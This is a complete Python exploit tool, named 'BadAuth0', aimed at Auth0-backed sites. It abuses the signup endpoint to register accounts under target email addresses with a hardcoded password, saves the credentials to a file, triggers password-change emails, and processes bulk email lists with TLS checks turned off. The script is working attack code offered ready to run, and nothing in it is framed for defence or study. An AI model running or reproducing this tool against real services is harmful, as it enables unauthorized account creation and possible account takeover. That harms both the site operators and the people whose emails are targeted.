#!/usr/bin/env python3
import os
import sys
import time
import argparse
import requests
import urllib3
from typing import List, Optional

# ANSI color codes
class Colors:
    BLUE = "\033[94m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    END = "\033[0m"
    BOLD = "\033[1m"

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    """Display the tool banner"""
    print(rf"""{Colors.CYAN}{Colors.BOLD}
  ____            _    _   _   _ _   _      ___  
 | __ )  __ _  __| |  / \ | | | | |_| |__  / _ \ 
 |  _ \ / _` |/ _` | / _ \| | | | __| '_ \| | | |
 | |_) | (_| | (_| |/ ___ \ |_| | |_| | | | |_| |
 |____/ \__,_|\__,_/_/   \_\___/ \__|_| |_|\___/ 
{Colors.END}                                                                
""")
    time.sleep(0.2)

def create_output_directory(directory: str) -> str:
    """Create directory for output files"""
    try:
        print(f"{Colors.BLUE}[*] Creating directory '{directory}'...{Colors.END}")
        os.makedirs(directory, exist_ok=True)
        abs_path = os.path.abspath(directory)
        print(f"{Colors.GREEN}[+] Directory created successfully at {abs_path}{Colors.END}")
        return abs_path
    except Exception as e:
        print(f"{Colors.RED}[-] Error creating directory: {e}{Colors.END}")
        sys.exit(1)

def exploit_target(host: str, email: str, output_dir: str, verbose: bool = False) -> bool:
    """Attempt to exploit the vulnerability"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'application/json'
    }

    payload = {
        'client_id': '',
        'email': email,
        'password': 'rQ8a2;3/c[<J',  # Default password
        'connection': 'Username-Password-Authentication'
    }

    try:
        if verbose:
            print(f"{Colors.BLUE}[*] Attempting to create account for {email} on {host}...{Colors.END}")
        
        response = requests.post(
            f'https://{host}/dbconnections/signup',
            headers=headers,
            json=payload,
            verify=False,
            timeout=10
        )

        if response.status_code in [200, 201]:
            print(f"{Colors.GREEN}[+] Account created successfully!{Colors.END}")
            print(f"{Colors.GREEN}    Email: {email}{Colors.END}")
            print(f"{Colors.GREEN}    Password: rQ8a2;3/c[<J{Colors.END}")
            
            # Save credentials to file
            output_file = os.path.join(output_dir, "credentials.txt")
            with open(output_file, "a") as f:
                f.write(f"Host: {host}\nEmail: {email}\nPassword: rQ8a2;3/c[<J\n\n")
            
            if verbose:
                print(f"{Colors.BLUE}[*] Credentials saved to {output_file}{Colors.END}")
            
            return True
        else:
            print(f"{Colors.RED}[-] Failed to create account (Status: {response.status_code}){Colors.END}")
            if verbose:
                print(f"{Colors.YELLOW}[!] Response: {response.text}{Colors.END}")
            return False

    except Exception as e:
        print(f"{Colors.RED}[-] Error during exploitation: {e}{Colors.END}")
        return False

def verify_email(host: str, email: str, verbose: bool = False) -> bool:
    """Send email verification request"""
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Content-Type': 'application/json'
    }

    payload = {
        'email': email,
        'connection': 'Username-Password-Authentication'
    }

    try:
        if verbose:
            print(f"{Colors.BLUE}[*] Sending verification email to {email}...{Colors.END}")
        
        response = requests.post(
            f'https://{host}/dbconnections/change_password',
            headers=headers,
            json=payload,
            verify=False,
            timeout=10
        )

        if response.status_code in [200, 201]:
            print(f"{Colors.GREEN}[+] Verification email sent to {email}{Colors.END}")
            return True
        else:
            print(f"{Colors.RED}[-] Failed to send verification (Status: {response.status_code}){Colors.END}")
            if verbose:
                print(f"{Colors.YELLOW}[!] Response: {response.text}{Colors.END}")
            return False

    except Exception as e:
        print(f"{Colors.RED}[-] Error during email verification: {e}{Colors.END}")
        return False

def process_list(host: str, email_list: str, output_dir: str, verbose: bool = False):
    """Process a list of email addresses"""
    try:
        with open(email_list, 'r') as f:
            emails = [line.strip() for line in f if line.strip()]
        
        print(f"{Colors.BLUE}[*] Processing {len(emails)} emails from {email_list}{Colors.END}")
        
        for email in emails:
            if '@' not in email:  # Basic email validation
                print(f"{Colors.YELLOW}[!] Skipping invalid email: {email}{Colors.END}")
                continue
            
            print(f"\n{Colors.CYAN}[*] Processing {email}{Colors.END}")
            if exploit_target(host, email, output_dir, verbose):
                verify_email(host, email, verbose)
            time.sleep(1)  # Rate limiting
    
    except FileNotFoundError:
        print(f"{Colors.RED}[-] File not found: {email_list}{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[-] Error processing email list: {e}{Colors.END}")
        sys.exit(1)

def main():
    print_banner()

    parser = argparse.ArgumentParser(
        description=f"{Colors.CYAN}Auth0 Account Creation Exploit Tool{Colors.END}",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('-d', '--domain', required=True, help='Target domain (e.g., example.com)')
    parser.add_argument('-e', '--email', help='Single email address to target')
    parser.add_argument('-l', '--list', help='File containing list of email addresses')
    parser.add_argument('-o', '--output', default='output', help='Output directory (default: ./output)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()

    # Validate input
    if not args.email and not args.list:
        print(f"{Colors.RED}[-] You must specify either -e/--email or -l/--list{Colors.END}")
        sys.exit(1)
    
    if args.email and args.list:
        print(f"{Colors.YELLOW}[!] Both email and list provided, using list only{Colors.END}")
        args.email = None

    # Create output directory
    output_dir = create_output_directory(args.output)

    # Process targets
    if args.list:
        process_list(args.domain, args.list, output_dir, args.verbose)
    else:
        if '@' not in args.email:
            print(f"{Colors.RED}[-] Invalid email address: {args.email}{Colors.END}")
            sys.exit(1)
        
        if exploit_target(args.domain, args.email, output_dir, args.verbose):
            verify_email(args.domain, args.email, args.verbose)

    print(f"\n{Colors.GREEN}[+] Operation completed{Colors.END}")

if __name__ == "__main__":
    main()
